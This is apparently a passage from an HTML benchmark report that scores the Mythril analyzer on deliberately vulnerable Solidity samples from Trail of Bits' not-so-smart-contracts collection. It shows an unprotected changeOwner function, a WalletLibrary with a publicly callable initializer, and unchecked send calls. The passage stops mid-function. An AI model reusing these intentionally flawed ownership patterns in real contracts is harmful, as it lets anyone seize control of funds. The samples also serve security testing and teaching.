            <span class="kt">uint</span> <span class="n">excessPaid</span> <span class="o">=</span> <span class="n">valuePaid</span> <span class="o">-</span> <span class="n">currentClaimPrice</span><span class="p">;</span>
            <span class="nb">msg.sender</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">excessPaid</span><span class="p">);</span>
            <span class="n">valuePaid</span> <span class="o">=</span> <span class="n">valuePaid</span> <span class="o">-</span> <span class="n">excessPaid</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// The claim price payment goes to the current monarch as compensation</span>
        <span class="c1">// (with a commission held back for the wizard). We let the wizard&#39;s</span>
        <span class="c1">// payments accumulate to avoid wasting gas sending small fees.</span>

        <span class="kt">uint</span> <span class="n">wizardCommission</span> <span class="o">=</span> <span class="p">(</span><span class="n">valuePaid</span> <span class="o">*</span> <span class="n">wizardCommissionFractionNum</span><span class="p">)</span> <span class="o">/</span> <span class="n">wizardCommissionFractionDen</span><span class="p">;</span>
        
        <span class="kt">uint</span> <span class="n">compensation</span> <span class="o">=</span> <span class="n">valuePaid</span> <span class="o">-</span> <span class="n">wizardCommission</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">currentMonarch</span><span class="p">.</span><span class="n">etherAddress</span> <span class="o">!=</span> <span class="n">wizardAddress</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">currentMonarch</span><span class="p">.</span><span class="n">etherAddress</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">compensation</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="c1">// When the throne is vacant, the fee accumulates for the wizard.</span>
        <span class="p">}</span>

        <span class="c1">// Usurp the current monarch, replacing them with the new one.</span>
        <span class="n">pastMonarchs</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="n">currentMonarch</span><span class="p">);</span>
        <span class="n">currentMonarch</span> <span class="o">=</span> <span class="n">Monarch</span><span class="p">(</span>
            <span class="nb">msg.sender</span><span class="p">,</span>
            <span class="n">name</span><span class="p">,</span>
            <span class="n">valuePaid</span><span class="p">,</span>
            <span class="nb">block.timestamp</span>
        <span class="p">);</span>

        <span class="c1">// Increase the claim fee for next time.</span>
        <span class="c1">// Stop number of trailing decimals getting silly - we round it a bit.</span>
        <span class="kt">uint</span> <span class="n">rawNewClaimPrice</span> <span class="o">=</span> <span class="n">currentClaimPrice</span> <span class="o">*</span> <span class="n">claimPriceAdjustNum</span> <span class="o">/</span> <span class="n">claimPriceAdjustDen</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="kc">finney</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="n">rawNewClaimPrice</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">&lt;</span> <span class="mi">100</span> <span class="kc">finney</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="mi">100</span> <span class="kc">szabo</span> <span class="o">*</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">/</span> <span class="mi">100</span> <span class="kc">szabo</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="mi">1</span> <span class="kc">finney</span> <span class="o">*</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">finney</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">&lt;</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="mi">10</span> <span class="kc">finney</span> <span class="o">*</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">/</span> <span class="mi">10</span> <span class="kc">finney</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">&lt;</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="mi">100</span> <span class="kc">finney</span> <span class="o">*</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">/</span> <span class="mi">100</span> <span class="kc">finney</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">&lt;</span> <span class="mi">1000</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="mi">1</span> <span class="kc">ether</span> <span class="o">*</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">&lt;</span> <span class="mi">10000</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="mi">10</span> <span class="kc">ether</span> <span class="o">*</span> <span class="p">(</span><span class="n">rawNewClaimPrice</span> <span class="o">/</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">currentClaimPrice</span> <span class="o">=</span> <span class="n">rawNewClaimPrice</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Hail the new monarch!</span>
        <span class="n">ThroneClaimed</span><span class="p">(</span><span class="n">currentMonarch</span><span class="p">.</span><span class="n">etherAddress</span><span class="p">,</span> <span class="n">currentMonarch</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">currentClaimPrice</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Used only by the wizard to collect his commission.</span>
    <span class="kd">function</span> <span class="n">sweepCommission</span><span class="p">(</span><span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="n">onlywizard</span> <span class="p">{</span>
        <span class="n">wizardAddress</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Used only by the wizard to collect his commission.</span>
    <span class="kd">function</span> <span class="n">transferOwnership</span><span class="p">(</span><span class="kt">address</span> <span class="n">newOwner</span><span class="p">)</span> <span class="n">onlywizard</span> <span class="p">{</span>
        <span class="n">wizardAddress</span> <span class="o">=</span> <span class="n">newOwner</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=unprotected_function/Unprotected>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//unprotected_function/Unprotected.sol">unprotected_function/Unprotected</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Unprotected Function</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">15</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">Unprotected</span><span class="p">{</span>
    <span class="kt">address</span> <span class="kr">private</span> <span class="n">owner</span><span class="p">;</span>

    <span class="kd">modifier</span> <span class="n">onlyowner</span> <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nb">msg.sender</span><span class="o">==</span><span class="n">owner</span><span class="p">);</span>
        <span class="kr">_</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">Unprotected</span><span class="p">()</span>
        <span class="kr">public</span> 
    <span class="p">{</span>
        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// This function should be protected</span>
    <span class="kd">function</span> <span class="n">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newOwner</span><span class="p">)</span> 
        <span class="kr">public</span>
    <span class="p">{</span>
       <span class="n">owner</span> <span class="o">=</span> <span class="n">_newOwner</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">changeOwner_fixed</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newOwner</span><span class="p">)</span> 
        <span class="kr">public</span> 
        <span class="n">onlyowner</span>
    <span class="p">{</span>
       <span class="n">owner</span> <span class="o">=</span> <span class="n">_newOwner</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=unprotected_function/WalletLibrary_source_code/WalletLibrary>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//unprotected_function/WalletLibrary_source_code/WalletLibrary.sol">unprotected_function/WalletLibrary_source_code/WalletLibrary</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Unprotected Function</td>
	        <td style="background-color:
		   rgba(128, 128, 128, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Unconfigured">Unconfigured</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="c1">// 0xa657491c1e7f16adb39b9b60e87bbb8d93988bc3#code</span>
<span class="c1">//sol Wallet</span>
<span class="c1">// Multi-sig, daily-limited account proxy/wallet.</span>
<span class="c1">// @authors:</span>
<span class="c1">// Gav Wood &lt;g@ethdev.com&gt;</span>
<span class="c1">// inheritable &quot;property&quot; contract that enables methods to be protected by requiring the acquiescence of either a</span>
<span class="c1">// single, or, crucially, each of a number of, designated owners.</span>
<span class="c1">// usage:</span>
<span class="c1">// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by</span>
<span class="c1">// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the</span>
<span class="c1">// interior is executed.</span>

<span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">9</span><span class="p">;</span>

<span class="kd">contract</span> <span class="n">WalletEvents</span> <span class="p">{</span>
  <span class="c1">// EVENTS</span>

  <span class="c1">// this contract only has six types of events: it can accept a confirmation, in which case</span>
  <span class="c1">// we record owner and operation (hash) alongside it.</span>
  <span class="kd">event</span> <span class="n">Confirmation</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">operation</span><span class="p">);</span>
  <span class="kd">event</span> <span class="n">Revoke</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">operation</span><span class="p">);</span>

  <span class="c1">// some others are in the case of an owner changing.</span>
  <span class="kd">event</span> <span class="n">OwnerChanged</span><span class="p">(</span><span class="kt">address</span> <span class="n">oldOwner</span><span class="p">,</span> <span class="kt">address</span> <span class="n">newOwner</span><span class="p">);</span>
  <span class="kd">event</span> <span class="n">OwnerAdded</span><span class="p">(</span><span class="kt">address</span> <span class="n">newOwner</span><span class="p">);</span>
  <span class="kd">event</span> <span class="n">OwnerRemoved</span><span class="p">(</span><span class="kt">address</span> <span class="n">oldOwner</span><span class="p">);</span>

  <span class="c1">// the last one is emitted if the required signatures change</span>
  <span class="kd">event</span> <span class="n">RequirementChanged</span><span class="p">(</span><span class="kt">uint</span> <span class="n">newRequirement</span><span class="p">);</span>

  <span class="c1">// Funds has arrived into the wallet (record how much).</span>
  <span class="kd">event</span> <span class="n">Deposit</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">value</span><span class="p">);</span>
  <span class="c1">// Single transaction going out of the wallet (record who signed for it, how much, and to whom it&#39;s going).</span>
  <span class="kd">event</span> <span class="n">SingleTransact</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">value</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">data</span><span class="p">,</span> <span class="kt">address</span> <span class="n">created</span><span class="p">);</span>
  <span class="c1">// Multi-sig transaction going out of the wallet (record who signed for it last, the operation hash, how much, and to whom it&#39;s going).</span>
  <span class="kd">event</span> <span class="n">MultiTransact</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">operation</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">value</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">data</span><span class="p">,</span> <span class="kt">address</span> <span class="n">created</span><span class="p">);</span>
  <span class="c1">// Confirmation still needed for a transaction.</span>
  <span class="kd">event</span> <span class="n">ConfirmationNeeded</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">operation</span><span class="p">,</span> <span class="kt">address</span> <span class="n">initiator</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">value</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">contract</span> <span class="n">WalletAbi</span> <span class="p">{</span>
  <span class="c1">// Revokes a prior confirmation of the given operation</span>
  <span class="kd">function</span> <span class="n">revoke</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_operation</span><span class="p">)</span> <span class="kr">external</span><span class="p">;</span>

  <span class="c1">// Replaces an owner `_from` with another `_to`.</span>
  <span class="kd">function</span> <span class="n">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="kr">external</span><span class="p">;</span>

  <span class="kd">function</span> <span class="n">addOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="kr">external</span><span class="p">;</span>

  <span class="kd">function</span> <span class="n">removeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="kr">external</span><span class="p">;</span>

  <span class="kd">function</span> <span class="n">changeRequirement</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_newRequired</span><span class="p">)</span> <span class="kr">external</span><span class="p">;</span>

  <span class="kd">function</span> <span class="n">isOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>

  <span class="kd">function</span> <span class="n">hasConfirmed</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_operation</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="kr">external</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>

  <span class="c1">// (re)sets the daily limit. needs many of the owners to confirm. doesn&#39;t alter the amount already spent today.</span>
  <span class="kd">function</span> <span class="n">setDailyLimit</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_newLimit</span><span class="p">)</span> <span class="kr">external</span><span class="p">;</span>

  <span class="kd">function</span> <span class="n">execute</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">_data</span><span class="p">)</span> <span class="kr">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span> <span class="n">o_hash</span><span class="p">);</span>
  <span class="kd">function</span> <span class="n">confirm</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_h</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">o_success</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">contract</span> <span class="n">WalletLibrary</span> <span class="kr">is</span> <span class="n">WalletEvents</span> <span class="p">{</span>
  <span class="c1">// TYPES</span>

  <span class="c1">// struct for the status of a pending operation.</span>
  <span class="kd">struct</span> <span class="n">PendingState</span> <span class="p">{</span>
    <span class="kt">uint</span> <span class="n">yetNeeded</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="n">ownersDone</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="n">index</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// Transaction structure to remember details of transaction lest it need be saved for a later call.</span>
  <span class="kd">struct</span> <span class="n">Transaction</span> <span class="p">{</span>
    <span class="kt">address</span> <span class="n">to</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="n">value</span><span class="p">;</span>
    <span class="kt">bytes</span> <span class="n">data</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// MODIFIERS</span>

  <span class="c1">// simple single-sig function modifier.</span>
  <span class="kd">modifier</span> <span class="n">onlyowner</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">isOwner</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">))</span>
      <span class="kr">_</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">// multi-sig function modifier: the operation must have an intrinsic hash in order</span>
  <span class="c1">// that later attempts can be realised as the same underlying operation and</span>
  <span class="c1">// thus count as confirmations.</span>
  <span class="kd">modifier</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_operation</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">confirmAndCheck</span><span class="p">(</span><span class="n">_operation</span><span class="p">))</span>
      <span class="kr">_</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// METHODS</span>

  <span class="c1">// gets called when no other function matches</span>
  <span class="kd">function</span><span class="p">()</span> <span class="kr">payable</span> <span class="p">{</span>
    <span class="c1">// just being sent some cash?</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
      <span class="n">Deposit</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="nb">msg.value</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// constructor is given number of sigs required to do protected &quot;onlymanyowners&quot; transactions</span>
  <span class="c1">// as well as the selection of addresses capable of confirming them.</span>
  <span class="kd">function</span> <span class="n">initMultiowned</span><span class="p">(</span><span class="kt">address</span><span class="p">[]</span> <span class="n">_owners</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_required</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">m_numOwners</span> <span class="o">=</span> <span class="n">_owners</span><span class="p">.</span><span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">m_owners</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">);</span>
    <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_owners</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">m_owners</span><span class="p">[</span><span class="mi">2</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="n">_owners</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
      <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_owners</span><span class="p">[</span><span class="n">i</span><span class="p">])]</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">i</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">m_required</span> <span class="o">=</span> <span class="n">_required</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// Revokes a prior confirmation of the given operation</span>
  <span class="kd">function</span> <span class="n">revoke</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_operation</span><span class="p">)</span> <span class="kr">external</span> <span class="p">{</span>
    <span class="kt">uint</span> <span class="n">ownerIndex</span> <span class="o">=</span> <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">)];</span>
    <span class="c1">// make sure they&#39;re an owner</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ownerIndex</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="n">ownerIndexBit</span> <span class="o">=</span> <span class="mi">2</span><span class="o">**</span><span class="n">ownerIndex</span><span class="p">;</span>
    <span class="kd">var</span> <span class="n">pending</span> <span class="o">=</span> <span class="n">m_pending</span><span class="p">[</span><span class="n">_operation</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pending</span><span class="p">.</span><span class="n">ownersDone</span> <span class="o">&amp;</span> <span class="n">ownerIndexBit</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">pending</span><span class="p">.</span><span class="n">yetNeeded</span><span class="o">++</span><span class="p">;</span>
      <span class="n">pending</span><span class="p">.</span><span class="n">ownersDone</span> <span class="o">-=</span> <span class="n">ownerIndexBit</span><span class="p">;</span>
      <span class="n">Revoke</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">_operation</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// Replaces an owner `_from` with another `_to`.</span>
  <span class="kd">function</span> <span class="n">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">)</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">))</span> <span class="kr">external</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">isOwner</span><span class="p">(</span><span class="n">_to</span><span class="p">))</span> <span class="k">return</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="n">ownerIndex</span> <span class="o">=</span> <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_from</span><span class="p">)];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ownerIndex</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>

    <span class="n">clearPending</span><span class="p">();</span>
    <span class="n">m_owners</span><span class="p">[</span><span class="n">ownerIndex</span><span class="p">]</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="n">_to</span><span class="p">);</span>
    <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_from</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_to</span><span class="p">)]</span> <span class="o">=</span> <span class="n">ownerIndex</span><span class="p">;</span>
    <span class="n">OwnerChanged</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="n">addOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">))</span> <span class="kr">external</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">isOwner</span><span class="p">(</span><span class="n">_owner</span><span class="p">))</span> <span class="k">return</span><span class="p">;</span>

    <span class="n">clearPending</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m_numOwners</span> <span class="o">&gt;=</span> <span class="n">c_maxOwners</span><span class="p">)</span>
      <span class="n">reorganizeOwners</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m_numOwners</span> <span class="o">&gt;=</span> <span class="n">c_maxOwners</span><span class="p">)</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="n">m_numOwners</span><span class="o">++</span><span class="p">;</span>
    <span class="n">m_owners</span><span class="p">[</span><span class="n">m_numOwners</span><span class="p">]</span> <span class="o">=</span> <span class="kt">uint</span><span class="p">(</span><span class="n">_owner</span><span class="p">);</span>
    <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_owner</span><span class="p">)]</span> <span class="o">=</span> <span class="n">m_numOwners</span><span class="p">;</span>
    <span class="n">OwnerAdded</span><span class="p">(</span><span class="n">_owner</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="n">removeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">))</span> <span class="kr">external</span> <span class="p">{</span>
    <span class="kt">uint</span> <span class="n">ownerIndex</span> <span class="o">=</span> <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_owner</span><span class="p">)];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ownerIndex</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">m_required</span> <span class="o">&gt;</span> <span class="n">m_numOwners</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>

    <span class="n">m_owners</span><span class="p">[</span><span class="n">ownerIndex</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_owner</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">clearPending</span><span class="p">();</span>
    <span class="n">reorganizeOwners</span><span class="p">();</span> <span class="c1">//make sure m_numOwner is equal to the number of owners and always points to the optimal free slot</span>
    <span class="n">OwnerRemoved</span><span class="p">(</span><span class="n">_owner</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="n">changeRequirement</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_newRequired</span><span class="p">)</span> <span class="n">onlymanyowners</span><span class="p">(</span><span class="nf">sha3</span><span class="p">(</span><span class="nb">msg.data</span><span class="p">))</span> <span class="kr">external</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">_newRequired</span> <span class="o">&gt;</span> <span class="n">m_numOwners</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
    <span class="n">m_required</span> <span class="o">=</span> <span class="n">_newRequired</span><span class="p">;</span>
    <span class="n">clearPending</span><span class="p">();</span>
    <span class="n">RequirementChanged</span><span class="p">(</span><span class="n">_newRequired</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// Gets an owner by 0-indexed position (using numOwners as the count)</span>
  <span class="kd">function</span> <span class="n">getOwner</span><span class="p">(</span><span class="kt">uint</span> <span class="n">ownerIndex</span><span class="p">)</span> <span class="kr">external</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">m_owners</span><span class="p">[</span><span class="n">ownerIndex</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="n">isOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">m_ownerIndex</span><span class="p">[</span><span class="kt">uint</span><span class="p">(</span><span class="n">_addr</span><span class="p">)]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="n">hasConfirmed</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_operation</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="kr">external</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
